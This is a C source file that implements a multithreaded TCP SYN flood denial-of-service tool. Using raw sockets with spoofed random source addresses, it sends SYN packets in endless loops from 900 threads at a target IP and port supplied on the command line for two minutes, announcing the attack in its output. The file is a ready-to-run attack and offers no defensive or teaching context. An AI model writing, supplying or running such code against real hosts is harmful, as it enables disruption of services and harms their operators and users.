#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

#define THREAD_COUNT 900
#define FLOOD_DURATION 120

// Raw TCP packet structure
struct tcp_packet {
    struct iphdr ip_header;
    struct tcphdr tcp_header;
};

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *syn_flood(void *arg) {
    struct sockaddr_in *target = (struct sockaddr_in *)arg;
    char packet[sizeof(struct tcp_packet)];
    memset(packet, 0, sizeof(packet));
    
    struct tcp_packet *tcp_pkt = (struct tcp_packet *)packet;
    
    // IP header
    tcp_pkt->ip_header.ihl = 5;
    tcp_pkt->ip_header.version = 4;
    tcp_pkt->ip_header.tot_len = htons(sizeof(struct tcp_packet));
    tcp_pkt->ip_header.id = htons(rand() % 65535);
    tcp_pkt->ip_header.ttl = 64;
    tcp_pkt->ip_header.protocol = IPPROTO_TCP;
    tcp_pkt->ip_header.saddr = rand();  // Spoofed source IP
    tcp_pkt->ip_header.daddr = target->sin_addr.s_addr;
    
    // TCP header
    tcp_pkt->tcp_header.source = htons(rand() % 65535);
    tcp_pkt->tcp_header.dest = target->sin_port;
    tcp_pkt->tcp_header.seq = rand();
    tcp_pkt->tcp_header.ack_seq = 0;
    tcp_pkt->tcp_header.doff = 5;
    tcp_pkt->tcp_header.syn = 1;
    tcp_pkt->tcp_header.window = htons(5840);
    tcp_pkt->tcp_header.check = 0;
    
    // Calculate checksums
    tcp_pkt->tcp_header.check = checksum((unsigned short *)&tcp_pkt->tcp_header, sizeof(struct tcphdr));
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        return NULL;
    }
    
    while (1) {
        if (sendto(sock, packet, sizeof(packet), 0, 
            (struct sockaddr *)target, sizeof(*target)) < 0) {
            perror("sendto");
        }
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));
    
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    if (inet_pton(AF_INET, argv[1], &target.sin_addr) <= 0) {
        perror("inet_pton");
        return 1;
    }

    printf("[!] Starting TCP SYN Flood on %s:%s\n", argv[1], argv[2]);

    pthread_t threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, syn_flood, &target) != 0) {
            perror("pthread_create");
            return 1;
        }
    }

    sleep(FLOOD_DURATION);
    printf("[+] Attack finished\n");
    return 0;
}
